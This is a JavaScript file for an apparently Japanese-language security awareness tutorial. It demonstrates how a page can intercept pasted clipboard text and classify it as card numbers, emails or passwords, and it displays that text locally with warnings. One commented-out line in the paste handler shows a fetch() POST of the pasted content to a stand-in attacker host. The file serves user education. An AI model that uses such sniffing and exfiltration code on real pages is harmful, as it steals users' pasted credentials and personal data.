// sniff.js - pasteイベントスニッフィング処理

window.addEventListener("DOMContentLoaded", () => {
  const sniffInput = document.getElementById("sniffInput");
  const sniffLog = document.getElementById("sniffLog");
  let sniffTutorialStep = 1;
  let pasteCount = 0;

  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }

  function updateSniffTutorialStep(stepNumber) {
    document.querySelectorAll('#tab-sniff .step').forEach((step, index) => {
      step.classList.remove('active');
      if (index < stepNumber - 1) {
        step.classList.add('completed');
      }
    });
    
    const currentStep = document.getElementById(`sniff-step${stepNumber}`);
    if (currentStep) {
      currentStep.classList.add('active');
    }
    sniffTutorialStep = stepNumber;
  }

  window.selectSniffText = function(element) {
    const selection = window.getSelection();
    const range = document.createRange();
    range.selectNodeContents(element);
    selection.removeAllRanges();
    selection.addRange(range);
    element.classList.add('selected');
    setTimeout(() => {
      element.classList.remove('selected');
    }, 2000);
    
    // ステップ1完了、ステップ2へ
    if (sniffTutorialStep === 1) {
      updateSniffTutorialStep(2);
    }
  };

  window.resetSniffDemo = function() {
    pasteCount = 0;
    sniffInput.value = '';
    sniffLog.innerHTML = '<div class="message info">📋 デモをリセットしました。上の入力欄に何かを貼り付けて、pasteイベントスニッフィングを体験してください。</div>';
  };

  window.resetSniffTutorial = function() {
    document.querySelectorAll('#tab-sniff .step').forEach(step => {
      step.classList.remove('completed', 'active');
    });
    document.getElementById('sniff-step1').classList.add('active');
    sniffTutorialStep = 1;
    pasteCount = 0;
    sniffInput.value = '';
    sniffLog.innerHTML = '<div class="message info">📋 チュートリアルをリセットしました。ステップ1から始めましょう！</div>';
    
    // 全ボタンを非表示にする
    const step3Button = document.querySelector('#sniff-step3 .step-ok-button');
    if (step3Button) {
      step3Button.style.display = 'none';
    }
    const step5Button = document.querySelector('#sniff-step5 .step-ok-button');
    if (step5Button) {
      step5Button.style.display = 'none';
    }
  };

  window.confirmStep3 = function() {
    // ステップ3完了、ステップ4へ進む
    updateSniffTutorialStep(4);
    
    // OKボタンを非表示にする
    const okButton = document.querySelector('#sniff-step3 .step-ok-button');
    if (okButton) {
      okButton.style.display = 'none';
    }
  };

  window.confirmStep5 = function() {
    // ステップ5完了、チュートリアル終了
    document.getElementById('sniff-step5').classList.add('completed');
    document.getElementById('sniff-step5').classList.remove('active');
    
    // ボタンを非表示にする
    const step5Button = document.querySelector('#sniff-step5 .step-ok-button');
    if (step5Button) {
      step5Button.style.display = 'none';
    }
    
    // お祝いメッセージを表示
    sniffLog.innerHTML = `
      <div class="clipboard-result">
        <div class="action-info">
          <span class="action">🎉 チュートリアル完了！</span>
          <span class="timestamp">${new Date().toLocaleTimeString('ja-JP')}</span>
        </div>
        <div class="content-info">
          <div class="preview" style="background: #e8f5e9; color: #2e7d32; border: 1px solid #4caf50;">
            <strong>おめでとうございます！</strong><br>
            pasteイベントスニッフィングの仕組みを完全理解！<br>
            🎭 貼り付け内容の傍受方法を体験<br>
            🔍 データタイプ判別機能を確認<br>
            ⚠️ セキュリティリスクの深刻さを認識<br>
            今後は信頼できないサイトでの貼り付けに注意しましょう！
          </div>
        </div>
      </div>
    `;
  };

  function detectDataType(text) {
    if (/^\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}$/.test(text)) return 'クレジットカード番号';
    if (/^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$/i.test(text)) return 'メールアドレス';
    if (/^https?:\/\//.test(text)) return 'URL';
    if (/password|pass|pwd/i.test(text)) return 'パスワード';
    return 'テキスト';
  }

  sniffInput.addEventListener("paste", (event) => {
    // クリップボードから貼り付けられたテキストを取得
    const pastedText = event.clipboardData.getData("text");
    const escapedText = escapeHtml(pastedText);
    const dataType = detectDataType(pastedText);
    const timestamp = new Date().toLocaleTimeString('ja-JP');
    pasteCount++;

    // 可視化ログに表示
    sniffLog.innerHTML = `
      <div class="clipboard-result">
        <div class="action-info">
          <span class="action">✅ pasteイベント検知 #${pasteCount}</span>
          <span class="timestamp">${timestamp}</span>
        </div>
        <div class="content-info">
          <div class="preview"><code>${escapedText}</code></div>
          <div class="meta">
            <span>文字数: ${pastedText.length}</span>
            <span>データタイプ: ${dataType}</span>
          </div>
        </div>
        <div class="action-explanation">
          <small>⚠️ 実際の攻撃では、この情報が攻撃者のサーバーに送信されます</small>
        </div>
      </div>
    `;

    // チュートリアル進行管理
    if (sniffTutorialStep === 2) {
      updateSniffTutorialStep(3);
      // ステップ3でOKボタンを表示
      const okButton = document.querySelector('#sniff-step3 .step-ok-button');
      if (okButton) {
        okButton.style.display = 'inline-block';
      }
    } else if (sniffTutorialStep === 4 && pasteCount >= 2) {
      updateSniffTutorialStep(5);
      // ステップ5で理解しましたボタンを表示
      const step5Button = document.querySelector('#sniff-step5 .step-ok-button');
      if (step5Button) {
        step5Button.style.display = 'inline-block';
      }
    }

    // 攻撃シミュレーション（送信処理は行わないが、実際は fetch() など）
    console.log("Sniffed paste content:", pastedText);
    // fetch("https://attacker.example.com/leak", { method: "POST", body: pastedText });
  });

  // アコーディオン機能
  window.toggleAttackScenariosAccordion = function() {
    const header = document.querySelector('#attackScenariosAccordionContent').previousElementSibling;
    const content = document.getElementById('attackScenariosAccordionContent');
    const icon = header.querySelector('.accordion-icon');
    
    header.classList.toggle('active');
    content.classList.toggle('open');
    
    if (content.classList.contains('open')) {
      icon.textContent = '▲';
    } else {
      icon.textContent = '▼';
    }
  };

  window.toggleSniffAccordion = function() {
    const header = document.querySelector('#sniffAccordionContent').previousElementSibling;
    const content = document.getElementById('sniffAccordionContent');
    const icon = header.querySelector('.accordion-icon');
    
    header.classList.toggle('active');
    content.classList.toggle('open');
    
    if (content.classList.contains('open')) {
      icon.textContent = '▲';
    } else {
      icon.textContent = '▼';
    }
  };

  // チュートリアル初期化
  document.getElementById('sniff-step1').classList.add('active');
});
